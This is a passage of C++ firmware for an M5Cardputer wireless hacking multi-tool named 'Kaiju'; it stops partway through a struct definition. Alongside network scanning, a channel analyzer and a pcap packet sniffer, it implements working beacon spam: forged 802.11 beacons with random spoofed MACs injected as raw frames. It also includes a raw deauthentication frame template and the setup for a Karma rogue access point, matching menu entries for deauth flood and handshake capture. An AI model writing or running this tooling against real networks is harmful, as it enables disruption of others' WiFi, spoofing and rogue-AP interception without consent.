#include <atomic>
#include <cctype>
#include <cstdio>
#include <cstring>
#include <M5Cardputer.h>
#include <SD.h>
#include <SPI.h>
#include <WiFi.h>
#include "esp_wifi.h"

namespace {

constexpr uint16_t COLOR_PRIMARY = 0xD5B1;   // 70s tan #D2B48C
constexpr uint16_t COLOR_SECONDARY = 0x9BCA; // brown #9C7A52
constexpr uint16_t COLOR_BG = TFT_BLACK;

const char *const MENU_ITEMS[] = {"WiFi", "BLE", "RF 433MHz", "NRF24 2.4GHz", "IR", "RFID", "Files", "Settings"};
constexpr int MENU_COUNT = sizeof(MENU_ITEMS) / sizeof(MENU_ITEMS[0]);
constexpr int WIFI_ITEM = 0;

const char *const WIFI_TOOLS[] = {"Scan networks", "Channel analyzer", "Packet sniffer", "Beacon spam", "Deauth flood", "Karma", "Handshake capture"};
constexpr int WIFI_TOOL_COUNT = sizeof(WIFI_TOOLS) / sizeof(WIFI_TOOLS[0]);
constexpr int WIFI_TOOL_SCAN = 0;
constexpr int WIFI_TOOL_CHANNELS = 1;
constexpr int WIFI_TOOL_SNIFF = 2;
constexpr int WIFI_TOOL_BEACON = 3;
constexpr int WIFI_TOOL_DEAUTH = 4;
constexpr int WIFI_TOOL_KARMA = 5;
constexpr int WIFI_TOOL_HANDSHAKE = 6;

constexpr int WIFI_VISIBLE_ROWS = 8;
constexpr int CH_FIRST = 1;
constexpr int CH_LAST = 13;
constexpr uint32_t CH_DWELL_MS = 300;
constexpr int BAR_BASE_Y = 108;
constexpr int BAR_MAX_H = 72;

enum class Screen { Menu, Placeholder, WifiMenu, WifiScan, WifiChannels, WifiSniff, WifiSpamSelect, WifiSpamText, WifiSpamRun, WifiDeauthSelect, WifiDeauthCheck, WifiDeauthRun, WifiKarmaRun, WifiHsRun };

Screen screen = Screen::Menu;
int selected = 0;
int wifiToolSel = 0;
int netCount = 0;
int netSel = 0;
int netTop = 0;

volatile uint32_t chFrames[CH_LAST + 1] = {};
volatile uint32_t chBeacons[CH_LAST + 1] = {};
uint32_t sweepFrames[CH_LAST + 1] = {};
uint32_t sweepBeacons[CH_LAST + 1] = {};
int chCurrent = CH_FIRST;
int sweepCount = 0;
uint32_t chDwellStart = 0;

void drawSplash() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.setTextSize(3);
    d.drawString("Kaiju", 60, 30);
    d.setTextSize(1);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Cappy's Play", 75, 90);
}

void drawMenu() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(2);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.drawString("KAIJU", 8, 4);
    d.setTextSize(1);
    for (int i = 0; i < MENU_COUNT; i++) {
        int y = 32 + i * 12;
        if (i == selected) {
            d.fillRect(0, y - 1, d.width(), 11, COLOR_PRIMARY);
            d.setTextColor(COLOR_BG, COLOR_PRIMARY);
        } else {
            d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        }
        d.drawString(MENU_ITEMS[i], 10, y);
    }
}

void drawWifiMenu() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(2);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.drawString("WiFi", 8, 4);
    d.setTextSize(1);
    for (int i = 0; i < WIFI_TOOL_COUNT; i++) {
        int y = 32 + i * 12;
        if (i == wifiToolSel) {
            d.fillRect(0, y - 1, d.width(), 11, COLOR_PRIMARY);
            d.setTextColor(COLOR_BG, COLOR_PRIMARY);
        } else {
            d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        }
        d.drawString(WIFI_TOOLS[i], 10, y);
    }
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Backspace: back", 4, 124);
}

void drawPlaceholder() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(2);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.drawString(MENU_ITEMS[selected], 8, 20);
    d.setTextSize(1);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Not built yet.", 8, 60);
    d.drawString("Backspace: back", 8, 110);
}

void drawWifiMessage(const char *msg) {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.drawString(msg, 8, 60);
}

void drawWifiScan() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char header[32];
    snprintf(header, sizeof(header), "WiFi: %d networks", netCount);
    d.drawString(header, 4, 4);

    for (int row = 0; row < WIFI_VISIBLE_ROWS; row++) {
        int idx = netTop + row;
        if (idx >= netCount) break;
        int y = 18 + row * 12;
        if (idx == netSel) {
            d.fillRect(0, y - 1, d.width(), 11, COLOR_PRIMARY);
            d.setTextColor(COLOR_BG, COLOR_PRIMARY);
        } else {
            d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        }
        String ssid = WiFi.SSID(idx);
        if (ssid.length() == 0) ssid = "<hidden>";
        char line[48];
        snprintf(line, sizeof(line), "%-16.16s %4ld dBm ch%-2ld", ssid.c_str(), (long)WiFi.RSSI(idx),
                 (long)WiFi.channel(idx));
        d.drawString(line, 4, y);
    }

    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter: rescan  Bksp: back", 4, 124);
}

void scanWifi() {
    drawWifiMessage("Scanning...");
    WiFi.mode(WIFI_STA);
    WiFi.scanDelete();
    int n = WiFi.scanNetworks();
    netCount = n > 0 ? n : 0;
    netSel = 0;
    netTop = 0;
    drawWifiScan();
}

void moveWifiSelection(int delta) {
    int next = netSel + delta;
    if (next < 0 || next >= netCount) return;
    netSel = next;
    if (netSel < netTop) netTop = netSel;
    if (netSel >= netTop + WIFI_VISIBLE_ROWS) netTop = netSel - WIFI_VISIBLE_ROWS + 1;
    drawWifiScan();
}

void onPromiscuous(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
    int ch = pkt->rx_ctrl.channel;
    if (ch < CH_FIRST || ch > CH_LAST) return;
    chFrames[ch]++;
    if (type == WIFI_PKT_MGMT && pkt->rx_ctrl.sig_len > 0 && (pkt->payload[0] >> 4) == 0x8) {
        chBeacons[ch]++;
    }
}

void setAnalyzerChannel(int ch) {
    esp_wifi_set_channel(static_cast<uint8_t>(ch), WIFI_SECOND_CHAN_NONE);
}

void drawChannels() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char header[40];
    snprintf(header, sizeof(header), "Channels  sweep %d  Bksp: back", sweepCount);
    d.drawString(header, 4, 4);

    if (sweepCount == 0) {
        d.drawString("Listening... first sweep in about 4s.", 4, 60);
        return;
    }

    uint32_t maxFrames = 1;
    int busiest = CH_FIRST;
    for (int ch = CH_FIRST; ch <= CH_LAST; ch++) {
        if (sweepFrames[ch] > maxFrames) maxFrames = sweepFrames[ch];
        if (sweepFrames[ch] > sweepFrames[busiest]) busiest = ch;
    }

    for (int ch = CH_FIRST; ch <= CH_LAST; ch++) {
        int x = 8 + (ch - CH_FIRST) * 17;
        int h = static_cast<int>(sweepFrames[ch] * BAR_MAX_H / maxFrames);
        if (h < 1 && sweepFrames[ch] > 0) h = 1;
        if (h > 0) d.fillRect(x, BAR_BASE_Y - h, 12, h, COLOR_PRIMARY);
        char label[4];
        snprintf(label, sizeof(label), "%d", ch);
        d.setTextColor(COLOR_SECONDARY, COLOR_BG);
        d.drawString(label, x + 2, BAR_BASE_Y + 4);
    }

    char footer[48];
    snprintf(footer, sizeof(footer), "Busiest ch%d: %lu frames, %lu beacons", busiest,
             (unsigned long)sweepFrames[busiest], (unsigned long)sweepBeacons[busiest]);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString(footer, 4, 124);
}

void startChannelAnalyzer() {
    WiFi.mode(WIFI_STA);
    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&onPromiscuous);
    for (int ch = 0; ch <= CH_LAST; ch++) {
        chFrames[ch] = 0;
        chBeacons[ch] = 0;
        sweepFrames[ch] = 0;
        sweepBeacons[ch] = 0;
    }
    sweepCount = 0;
    chCurrent = CH_FIRST;
    setAnalyzerChannel(chCurrent);
    esp_wifi_set_promiscuous(true);
    chDwellStart = millis();
    drawChannels();
}

void stopChannelAnalyzer() {
    esp_wifi_set_promiscuous(false);
}

void tickChannelAnalyzer() {
    if (millis() - chDwellStart < CH_DWELL_MS) return;
    chDwellStart = millis();
    chCurrent++;
    if (chCurrent > CH_LAST) {
        chCurrent = CH_FIRST;
        for (int ch = CH_FIRST; ch <= CH_LAST; ch++) {
            sweepFrames[ch] = chFrames[ch];
            sweepBeacons[ch] = chBeacons[ch];
            chFrames[ch] = 0;
            chBeacons[ch] = 0;
        }
        sweepCount++;
        drawChannels();
    }
    setAnalyzerChannel(chCurrent);
}

enum SniffCounter : uint8_t {
    SNIFF_TOTAL,
    SNIFF_MGMT,
    SNIFF_CTRL,
    SNIFF_DATA,
    SNIFF_BEACON,
    SNIFF_PROBE_REQ,
    SNIFF_PROBE_RESP,
    SNIFF_AUTH,
    SNIFF_DEAUTH,
    SNIFF_DISASSOC,
    SNIFF_COUNT
};

volatile uint32_t sniffLive[SNIFF_COUNT] = {};
uint32_t sniffShown[SNIFF_COUNT] = {};
bool sniffHop = true;
int sniffCh = CH_FIRST;
uint32_t sniffDwellStart = 0;
uint32_t sniffRateStart = 0;
uint32_t sniffLastTotal = 0;
uint32_t sniffRate = 0;

constexpr int SD_SCK_PIN = 40;
constexpr int SD_MISO_PIN = 39;
constexpr int SD_MOSI_PIN = 14;
constexpr int SD_CS_PIN = 12;
constexpr uint32_t PCAP_SNAPLEN = 256;
constexpr uint32_t PCAP_RING_SIZE = 32768;
constexpr uint32_t PCAP_RECORD_HDR = 16;
constexpr uint32_t PCAP_CHUNK = 512;
constexpr uint32_t PCAP_LINKTYPE_IEEE802_11 = 105;

uint8_t pcapRing[PCAP_RING_SIZE];
std::atomic<uint32_t> pcapHead{0};
std::atomic<uint32_t> pcapTail{0};
std::atomic<uint32_t> pcapDropped{0};
std::atomic<bool> pcapActive{false};
File pcapFile;
bool pcapOpen = false;
bool sdReady = false;
uint32_t pcapBytes = 0;
char pcapName[40] = "";
char pcapMsg[40] = "R: record to SD";

void pcapPutLe32(uint8_t *dst, uint32_t v) {
    dst[0] = v & 0xFF;
    dst[1] = (v >> 8) & 0xFF;
    dst[2] = (v >> 16) & 0xFF;
    dst[3] = (v >> 24) & 0xFF;
}

void pcapRingWrite(uint32_t pos, const uint8_t *src, uint32_t n) {
    for (uint32_t i = 0; i < n; i++) {
        pcapRing[(pos + i) & (PCAP_RING_SIZE - 1)] = src[i];
    }
}

void pcapEnqueue(const wifi_promiscuous_pkt_t *pkt) {
    uint32_t origLen = pkt->rx_ctrl.sig_len;
    uint32_t capLen = origLen < PCAP_SNAPLEN ? origLen : PCAP_SNAPLEN;
    uint32_t need = PCAP_RECORD_HDR + capLen;
    uint32_t head = pcapHead.load(std::memory_order_relaxed);
    uint32_t tail = pcapTail.load(std::memory_order_acquire);
    if (PCAP_RING_SIZE - (head - tail) < need) {
        pcapDropped.fetch_add(1, std::memory_order_relaxed);
        return;
    }
    uint32_t us = micros();
    uint8_t hdr[PCAP_RECORD_HDR];
    pcapPutLe32(hdr, us / 1000000);
    pcapPutLe32(hdr + 4, us % 1000000);
    pcapPutLe32(hdr + 8, capLen);
    pcapPutLe32(hdr + 12, origLen);
    pcapRingWrite(head, hdr, PCAP_RECORD_HDR);
    pcapRingWrite(head + PCAP_RECORD_HDR, pkt->payload, capLen);
    pcapHead.store(head + need, std::memory_order_release);
}

void pcapFlush(uint32_t budget) {
    if (!pcapOpen) return;
    uint32_t tail = pcapTail.load(std::memory_order_relaxed);
    uint32_t avail = pcapHead.load(std::memory_order_acquire) - tail;
    uint8_t chunk[PCAP_CHUNK];
    while (avail > 0 && budget > 0) {
        uint32_t n = avail < PCAP_CHUNK ? avail : PCAP_CHUNK;
        if (n > budget) n = budget;
        for (uint32_t i = 0; i < n; i++) {
            chunk[i] = pcapRing[(tail + i) & (PCAP_RING_SIZE - 1)];
        }
        pcapFile.write(chunk, n);
        tail += n;
        avail -= n;
        budget -= n;
        pcapBytes += n;
    }
    pcapTail.store(tail, std::memory_order_release);
}

bool ensureSd() {
    if (!sdReady) {
        SPI.begin(SD_SCK_PIN, SD_MISO_PIN, SD_MOSI_PIN, SD_CS_PIN);
        sdReady = SD.begin(SD_CS_PIN, SPI, 25000000);
    }
    return sdReady;
}

void startPcap(const char *prefix) {
    if (!ensureSd()) {
        snprintf(pcapMsg, sizeof(pcapMsg), "no SD card found");
        return;
    }
    if (!SD.exists("/pcap")) SD.mkdir("/pcap");
    snprintf(pcapName, sizeof(pcapName), "%s_%lu.pcap", prefix, (unsigned long)(millis() / 1000));
    char path[64];
    snprintf(path, sizeof(path), "/pcap/%s", pcapName);
    pcapFile = SD.open(path, FILE_WRITE);
    if (!pcapFile) {
        snprintf(pcapMsg, sizeof(pcapMsg), "could not open file");
        return;
    }
    uint8_t globalHdr[24] = {0xD4, 0xC3, 0xB2, 0xA1, 2, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    pcapPutLe32(globalHdr + 16, PCAP_SNAPLEN);
    pcapPutLe32(globalHdr + 20, PCAP_LINKTYPE_IEEE802_11);
    pcapFile.write(globalHdr, sizeof(globalHdr));
    pcapBytes = sizeof(globalHdr);
    pcapTail.store(pcapHead.load(std::memory_order_acquire), std::memory_order_release);
    pcapDropped.store(0, std::memory_order_relaxed);
    pcapOpen = true;
    pcapActive.store(true, std::memory_order_release);
}

void stopPcap() {
    if (!pcapActive.load(std::memory_order_acquire)) return;
    pcapActive.store(false, std::memory_order_release);
    delay(5);
    pcapFlush(0xFFFFFFFFu);
    pcapFile.close();
    pcapOpen = false;
    snprintf(pcapMsg, sizeof(pcapMsg), "saved %lu KB", (unsigned long)(pcapBytes / 1024));
}

void toggleRecording() {
    if (pcapActive.load(std::memory_order_acquire)) {
        stopPcap();
    } else {
        startPcap("kaiju");
    }
}

void onSniff(void *buf, wifi_promiscuous_pkt_type_t type) {
    sniffLive[SNIFF_TOTAL]++;
    if (type != WIFI_PKT_MISC && pcapActive.load(std::memory_order_acquire)) {
        pcapEnqueue(static_cast<wifi_promiscuous_pkt_t *>(buf));
    }
    if (type == WIFI_PKT_CTRL) {
        sniffLive[SNIFF_CTRL]++;
        return;
    }
    if (type == WIFI_PKT_DATA) {
        sniffLive[SNIFF_DATA]++;
        return;
    }
    if (type != WIFI_PKT_MGMT) return;
    sniffLive[SNIFF_MGMT]++;
    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
    if (pkt->rx_ctrl.sig_len < 1) return;
    switch ((pkt->payload[0] >> 4) & 0xF) {
    case 0x4: sniffLive[SNIFF_PROBE_REQ]++; break;
    case 0x5: sniffLive[SNIFF_PROBE_RESP]++; break;
    case 0x8: sniffLive[SNIFF_BEACON]++; break;
    case 0xA: sniffLive[SNIFF_DISASSOC]++; break;
    case 0xB: sniffLive[SNIFF_AUTH]++; break;
    case 0xC: sniffLive[SNIFF_DEAUTH]++; break;
    default: break;
    }
}

void drawSniffer() {
    for (int i = 0; i < SNIFF_COUNT; i++) sniffShown[i] = sniffLive[i];
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char line[48];
    snprintf(line, sizeof(line), "Sniffer  ch%-2d  %s", sniffCh, sniffHop ? "hopping" : "locked");
    d.drawString(line, 4, 4);
    snprintf(line, sizeof(line), "Total %lu  (%lu/s)", (unsigned long)sniffShown[SNIFF_TOTAL],
             (unsigned long)sniffRate);
    d.drawString(line, 4, 18);
    snprintf(line, sizeof(line), "Mgmt %lu  Ctrl %lu  Data %lu", (unsigned long)sniffShown[SNIFF_MGMT],
             (unsigned long)sniffShown[SNIFF_CTRL], (unsigned long)sniffShown[SNIFF_DATA]);
    d.drawString(line, 4, 30);
    snprintf(line, sizeof(line), "Beacon %lu  ProbeReq %lu", (unsigned long)sniffShown[SNIFF_BEACON],
             (unsigned long)sniffShown[SNIFF_PROBE_REQ]);
    d.drawString(line, 4, 42);
    snprintf(line, sizeof(line), "ProbeResp %lu  Auth %lu", (unsigned long)sniffShown[SNIFF_PROBE_RESP],
             (unsigned long)sniffShown[SNIFF_AUTH]);
    d.drawString(line, 4, 54);
    snprintf(line, sizeof(line), "Deauth %lu  Disassoc %lu", (unsigned long)sniffShown[SNIFF_DEAUTH],
             (unsigned long)sniffShown[SNIFF_DISASSOC]);
    d.drawString(line, 4, 66);
    if (pcapActive.load(std::memory_order_acquire)) {
        snprintf(line, sizeof(line), "REC %s", pcapName);
        d.drawString(line, 4, 80);
        snprintf(line, sizeof(line), "%lu KB  drops %lu", (unsigned long)(pcapBytes / 1024),
                 (unsigned long)pcapDropped.load(std::memory_order_relaxed));
        d.drawString(line, 4, 92);
    } else {
        d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        d.drawString(pcapMsg, 4, 80);
    }
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter hop/lock  R rec  Bksp back", 4, 124);
}

void startSniffer() {
    WiFi.mode(WIFI_STA);
    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_CTRL |
                                        WIFI_PROMIS_FILTER_MASK_DATA};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&onSniff);
    for (int i = 0; i < SNIFF_COUNT; i++) {
        sniffLive[i] = 0;
        sniffShown[i] = 0;
    }
    sniffHop = true;
    sniffCh = CH_FIRST;
    setAnalyzerChannel(sniffCh);
    sniffLastTotal = 0;
    sniffRate = 0;
    sniffDwellStart = millis();
    sniffRateStart = sniffDwellStart;
    esp_wifi_set_promiscuous(true);
    drawSniffer();
}

void stopSniffer() {
    stopPcap();
    esp_wifi_set_promiscuous(false);
}

void tickSniffer() {
    uint32_t now = millis();
    if (sniffHop && now - sniffDwellStart >= CH_DWELL_MS) {
        sniffDwellStart = now;
        sniffCh = sniffCh >= CH_LAST ? CH_FIRST : sniffCh + 1;
        setAnalyzerChannel(sniffCh);
    }
    if (now - sniffRateStart >= 1000) {
        uint32_t total = sniffLive[SNIFF_TOTAL];
        sniffRate = total - sniffLastTotal;
        sniffLastTotal = total;
        sniffRateStart = now;
        drawSniffer();
    }
}

void moveSnifferChannel(int delta) {
    if (sniffHop) return;
    int next = sniffCh + delta;
    if (next < CH_FIRST) next = CH_LAST;
    if (next > CH_LAST) next = CH_FIRST;
    sniffCh = next;
    setAnalyzerChannel(sniffCh);
    drawSniffer();
}

constexpr int SPAM_MODE_COUNT = 5;
const char *const SPAM_MODE_NAMES[SPAM_MODE_COUNT] = {"Funny names", "Random names", "Single name + counter",
                                                       "Custom list (SD)", "Rick-roll names"};
enum SpamMode : uint8_t { SPAM_FUNNY, SPAM_RANDOM, SPAM_SINGLE, SPAM_CUSTOM, SPAM_ROLL };
constexpr char SPAM_CUSTOM_PATH[] = "/kaiju/ssids.txt";
constexpr int SPAM_CUSTOM_MAX = 64;
constexpr size_t SPAM_SSID_MAX = 32;
constexpr size_t SPAM_BASE_MAX = 26;
constexpr size_t SPAM_FRAME_MAX = 128;
constexpr int SPAM_HOP_MAX_CH = 11;
const char *const SPAM_FUNNY_NAMES[] = {
    "Router? More Like Outer Space", "Pretty Fly for a WiFi", "The LAN Before Time",
    "Bill Wi the Science Fi",        "Get Off My LAN",        "Tell My WiFi Love Her",
    "It Hurts When IP",              "Drop It Like Its Hotspot", "Loading Wi-Fi Please Wait",
    "Free Candy Hotspot"};
constexpr int SPAM_FUNNY_COUNT = sizeof(SPAM_FUNNY_NAMES) / sizeof(SPAM_FUNNY_NAMES[0]);
const char *const SPAM_ROLL_NAMES[] = {
    "Never Gonna Give You WiFi", "Never Gonna Let You Disconnect", "Never Gonna Run Around Your Router",
    "Never Gonna Drop Your Packets", "Never Gonna Make You Log In", "Never Gonna Let Your Signal Down"};
constexpr int SPAM_ROLL_COUNT = sizeof(SPAM_ROLL_NAMES) / sizeof(SPAM_ROLL_NAMES[0]);
constexpr uint8_t SPAM_RATES[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};

int spamModeSel = 0;
SpamMode spamMode = SPAM_FUNNY;
bool spamRunning = false;
bool spamHop = false;
int spamCh = 6;
uint32_t spamSent = 0;
uint32_t spamErrors = 0;
uint32_t spamRounds = 0;
uint32_t spamLastRound = 0;
uint32_t spamLastDraw = 0;
uint32_t spamCounter = 1;
char spamLast[SPAM_SSID_MAX + 1] = "";
char spamBase[SPAM_BASE_MAX + 1] = "";
char spamText[SPAM_BASE_MAX + 1] = "";
int spamTextLen = 0;
char spamCustom[SPAM_CUSTOM_MAX][SPAM_SSID_MAX + 1];
int spamCustomCount = 0;
char spamMsg[48] = "";

void spamRandomMac(uint8_t *mac) {
    mac[0] = static_cast<uint8_t>((random(0, 256) & 0xFC) | 0x02);
    for (int i = 1; i < 6; i++) {
        mac[i] = static_cast<uint8_t>(random(0, 256));
    }
}

void spamRandomName(char *out) {
    static const char CHARSET[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = random(7, 29);
    for (int i = 0; i < len; i++) {
        out[i] = CHARSET[random(0, 52)];
    }
    out[len] = '\0';
}

esp_err_t wifiTx(wifi_interface_t ifx, const uint8_t *frame, size_t len) {
    esp_err_t err = esp_wifi_80211_tx(ifx, frame, static_cast<int>(len), true);
    for (uint8_t i = 0; err == ESP_ERR_NO_MEM && i < 8; i++) {
        delay(1);
        err = esp_wifi_80211_tx(ifx, frame, static_cast<int>(len), true);
    }
    return err;
}

constexpr uint8_t BCAST_ADDR[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

size_t buildMgmt(uint8_t *f, uint8_t fc0, const uint8_t dst[6], const uint8_t src[6], const char *ssid, uint8_t ch) {
    uint8_t *p = f;
    p[0] = fc0;
    p[1] = 0x00;
    p[2] = 0x00;
    p[3] = 0x00;
    memcpy(p + 4, dst, 6);
    memcpy(p + 10, src, 6);
    memcpy(p + 16, src, 6);
    p[22] = 0x00;
    p[23] = 0x00;
    p += 24;
    memset(p, 0, 8);
    p += 8;
    *p++ = 0x64;
    *p++ = 0x00;
    *p++ = 0x01;
    *p++ = 0x04;
    size_t n = strlen(ssid);
    *p++ = 0x00;
    *p++ = static_cast<uint8_t>(n);
    memcpy(p, ssid, n);
    p += n;
    *p++ = 0x01;
    *p++ = static_cast<uint8_t>(sizeof(SPAM_RATES));
    memcpy(p, SPAM_RATES, sizeof(SPAM_RATES));
    p += sizeof(SPAM_RATES);
    *p++ = 0x03;
    *p++ = 0x01;
    *p++ = ch;
    return static_cast<size_t>(p - f);
}

size_t buildBeacon(uint8_t *f, const char *ssid, const uint8_t mac[6], uint8_t ch) {
    return buildMgmt(f, 0x80, BCAST_ADDR, mac, ssid, ch);
}

esp_err_t spamTx(const uint8_t *frame, size_t len) {
    return wifiTx(WIFI_IF_STA, frame, len);
}

void spamSendName(const char *name) {
    uint8_t mac[6];
    uint8_t frame[SPAM_FRAME_MAX];
    for (int k = 0; k < 2; k++) {
        spamRandomMac(mac);
        size_t len = buildBeacon(frame, name, mac, static_cast<uint8_t>(spamCh));
        if (spamTx(frame, len) == ESP_OK) {
            spamSent++;
        } else {
            spamErrors++;
        }
    }
    snprintf(spamLast, sizeof(spamLast), "%s", name);
    delay(1);
}

void spamRound() {
    spamRounds++;
    if (spamHop) {
        spamCh = spamCh >= SPAM_HOP_MAX_CH ? 1 : spamCh + 1;
        setAnalyzerChannel(spamCh);
    }
    char name[SPAM_SSID_MAX + 1];
    switch (spamMode) {
    case SPAM_FUNNY:
        for (int i = 0; i < SPAM_FUNNY_COUNT; i++) spamSendName(SPAM_FUNNY_NAMES[i]);
        break;
    case SPAM_RANDOM:
        for (int i = 0; i < 4; i++) {
            spamRandomName(name);
            spamSendName(name);
        }
        break;
    case SPAM_SINGLE:
        snprintf(name, sizeof(name), "%s-%lu", spamBase, (unsigned long)spamCounter);
        spamCounter = spamCounter >= 9999 ? 1 : spamCounter + 1;
        spamSendName(name);
        break;
    case SPAM_CUSTOM:
        for (int i = 0; i < spamCustomCount; i++) spamSendName(spamCustom[i]);
        break;
    case SPAM_ROLL:
        for (int i = 0; i < SPAM_ROLL_COUNT; i++) spamSendName(SPAM_ROLL_NAMES[i]);
        break;
    }
}

bool loadSpamCustom() {
    spamCustomCount = 0;
    if (!ensureSd()) {
        snprintf(spamMsg, sizeof(spamMsg), "no SD card found");
        return false;
    }
    File f = SD.open(SPAM_CUSTOM_PATH, FILE_READ);
    if (!f) {
        snprintf(spamMsg, sizeof(spamMsg), "missing %s", SPAM_CUSTOM_PATH);
        return false;
    }
    while (f.available() && spamCustomCount < SPAM_CUSTOM_MAX) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() == 0) continue;
        snprintf(spamCustom[spamCustomCount], SPAM_SSID_MAX + 1, "%s", line.c_str());
        spamCustomCount++;
    }
    f.close();
    if (spamCustomCount == 0) {
        snprintf(spamMsg, sizeof(spamMsg), "file has no names");
        return false;
    }
    snprintf(spamMsg, sizeof(spamMsg), "%d names loaded", spamCustomCount);
    return true;
}

void drawSpamSelect() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(2);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.drawString("Beacon", 8, 4);
    d.setTextSize(1);
    for (int i = 0; i < SPAM_MODE_COUNT; i++) {
        int y = 30 + i * 12;
        if (i == spamModeSel) {
            d.fillRect(0, y - 1, d.width(), 11, COLOR_PRIMARY);
            d.setTextColor(COLOR_BG, COLOR_PRIMARY);
        } else {
            d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        }
        d.drawString(SPAM_MODE_NAMES[i], 10, y);
    }
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    if (spamMsg[0] != '\0') d.drawString(spamMsg, 4, 100);
    d.drawString("Enter select  Bksp back", 4, 124);
}

void drawSpamText() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.drawString("Base name (max 26 chars):", 4, 20);
    char line[40];
    snprintf(line, sizeof(line), "%s_", spamText);
    d.drawString(line, 4, 40);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter start  Bksp delete", 4, 124);
}

void drawSpamRun() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char line[48];
    snprintf(line, sizeof(line), "Spam: %s", SPAM_MODE_NAMES[spamMode]);
    d.drawString(line, 4, 4);
    if (spamHop) {
        snprintf(line, sizeof(line), "%s  hop 1-%d", spamRunning ? "RUNNING" : "stopped", SPAM_HOP_MAX_CH);
    } else {
        snprintf(line, sizeof(line), "%s  ch%d", spamRunning ? "RUNNING" : "stopped", spamCh);
    }
    d.drawString(line, 4, 18);
    snprintf(line, sizeof(line), "Sent %lu  errors %lu", (unsigned long)spamSent, (unsigned long)spamErrors);
    d.drawString(line, 4, 32);
    snprintf(line, sizeof(line), "Rounds %lu  hop %s", (unsigned long)spamRounds, spamHop ? "on" : "off");
    d.drawString(line, 4, 44);
    snprintf(line, sizeof(line), "Last: %s", spamLast);
    d.drawString(line, 4, 56);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter run  H hop  ;. ch  Bksp back", 4, 124);
}

void startSpam() {
    WiFi.mode(WIFI_STA);
    setAnalyzerChannel(spamCh);
    spamSent = 0;
    spamErrors = 0;
    spamRounds = 0;
    spamLast[0] = '\0';
    spamLastRound = 0;
    spamLastDraw = 0;
    spamRunning = true;
}

void stopSpam() {
    spamRunning = false;
}

void tickSpam() {
    if (!spamRunning) return;
    uint32_t now = millis();
    if (now - spamLastRound >= 20) {
        spamLastRound = now;
        spamRound();
    }
    if (now - spamLastDraw >= 1000) {
        spamLastDraw = now;
        drawSpamRun();
    }
}

constexpr size_t DEAUTH_LEN = 26;
const uint8_t DEAUTH_TEMPLATE[DEAUTH_LEN] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                             0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};
const uint8_t KARMA_BSSID[6] = {0x02, 0x4b, 0x41, 0x52, 0x4d, 0x41};
constexpr int KARMA_QUEUE = 16;
constexpr int KARMA_CH_MAX = 13;
constexpr uint32_t KARMA_DWELL_MS = 250;
constexpr uint32_t CHECK_WINDOW_MS = 3000;

struct KarmaReq {
    uint8_t mac[6];
    uint8_t ch;
    uint8_t ssidLen;
